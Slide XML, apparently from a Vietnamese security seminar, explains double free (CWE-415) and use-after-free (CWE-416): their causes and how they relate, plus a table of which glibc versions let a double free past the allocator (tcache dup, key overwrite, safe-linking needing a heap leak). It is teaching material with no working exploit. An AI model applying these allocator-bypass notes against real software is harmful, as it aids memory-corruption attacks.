            <a:off x="9267444" y="286207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QUÊN GÁN NULL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="3154680"/>
            <a:ext cx="2281428" cy="107899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free xong không NULL hoá, destructor/cleanup gọi lần hai</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4572000"/>
            <a:ext cx="2647188" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4444"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="473659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UAF (CWE-416)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5029200"/>
            <a:ext cx="2281428" cy="107899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Dùng con trỏ sau khi free dẫn tới free lần nữa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3332988" y="4572000"/>
            <a:ext cx="2647188" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4444"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="473659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REALLOC HỎNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="5029200"/>
            <a:ext cx="2281428" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>realloc()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> lỗi rồi free cả con trỏ cũ lẫn mới</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="4572000"/>
            <a:ext cx="2647188" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4444"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="473659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ĐA LUỒNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="5029200"/>
            <a:ext cx="2281428" cy="107899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Hai thread cùng free một object, hoặc sai refcount</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="4572000"/>
            <a:ext cx="2647188" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4444"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="4736592"/>
            <a:ext cx="2281428"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NGUYÊN NHÂN GỐC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="5029200"/>
            <a:ext cx="2281428" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Quyền sở hữu vùng nhớ không rõ ràng, không quản lý tại một chỗ duy nhất</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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CWE-415 và CWE-416</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2 · MITRE CWE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2222"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1627632"/>
            <a:ext cx="5029200" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>LỖ HỔNG TRUNG TÂM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1920240"/>
            <a:ext cx="5029200" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CWE-415</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2743200"/>
            <a:ext cx="5029200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Double Free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3291840"/>
            <a:ext cx="5074920" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chương trình gọi free() hai lần trên cùng một địa chỉ bộ nhớ, có thể dẫn tới sửa đổi vùng nhớ ngoài dự kiến. Đây là lỗ hổng trung tâm của seminar.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2222"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6437376" y="1627632"/>
            <a:ext cx="5029200" cy="22860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LIÊN QUAN TRỰC TIẾP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6437376" y="1920240"/>
            <a:ext cx="5029200" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CWE-416</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6437376" y="2743200"/>
            <a:ext cx="5029200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Use After Free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6437376" y="3291840"/>
            <a:ext cx="5074920" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dùng con trỏ sau khi vùng nhớ đã được giải phóng. Vừa là tiền đề vừa là hệ quả của double free.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4937760"/>
            <a:ext cx="3605784" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="510235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416 → 415</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5394960"/>
            <a:ext cx="3240024" cy="71323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Dùng con trỏ đã free rồi free lại lần nữa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4291584" y="4937760"/>
            <a:ext cx="3605784" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="510235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415 → 416</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="5394960"/>
            <a:ext cx="3240024" cy="71323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Double free tạo hai con trỏ cùng trỏ một vùng nhớ, tức là UAF</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8125968" y="4937760"/>
            <a:ext cx="3605784" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="510235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362 + 415</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="5394960"/>
            <a:ext cx="3240024" cy="71323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Race condition dẫn tới free trùng (CVE-2025-62215)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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Free trùng có lọt qua allocator?</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5.4 · PHỤ THUỘC PHIÊN BẢN GLIBC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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1097280"/>
                <a:gridCol w="2926080"/>
                <a:gridCol w="3840480"/>
                <a:gridCol w="3410712"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>glibc</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kiểm tra của allocator</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Hành vi free trùng</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150" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Bản phân phối tiêu biểu</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>≤ 2.25</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>chưa có tcache; fastbin chỉ so phần tử đầu</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Lọt nếu free xen kẽ </a:t>
                      </a:r>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1150" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>free(a); free(b); free(a)</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CentOS 7 (2.17), Ubuntu 16.04 (2.23), Debian 9 (2.24)</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150" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>2.26–2.28</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>có tcache, chưa kiểm tra trùng</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accent1"/>
                          </a:solidFill>
                          <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>free(a); free(a)</a:t>
                      </a:r>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1150" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> lọt ngay (tcache dup)</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Ubuntu 18.04 (2.27), RHEL 8, Debian 10 (2.28)</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150" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>2.29–2.31</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>tcache kiểm tra key + duyệt danh sách</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Phải ghi đè key (qua UAF) hoặc lấp đầy bin để xuống fastbin rồi free xen kẽ</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Ubuntu 20.04, Debian 11 (2.31)</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150" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>≥ 2.32</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>thêm safe-linking cho next của tcache/fastbin</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Vẫn lọt như trên, nhưng giả mạo next cần heap leak</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>RHEL 9 (2.34), Ubuntu 22.04 (2.35), Debian 12 (2.36), Ubuntu 24.04 (2.39)</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150" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>≥ 2.42</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>tcache_max có thể tăng tới 4 MiB</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bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Giả định chunk &gt; 0x410 vào unsorted bin không còn luôn đúng</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150" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Ubuntu 25.10+, Fedora 43+</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="11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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4846320"/>
            <a:ext cx="3605784" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="501091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SAFE-LINKING</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
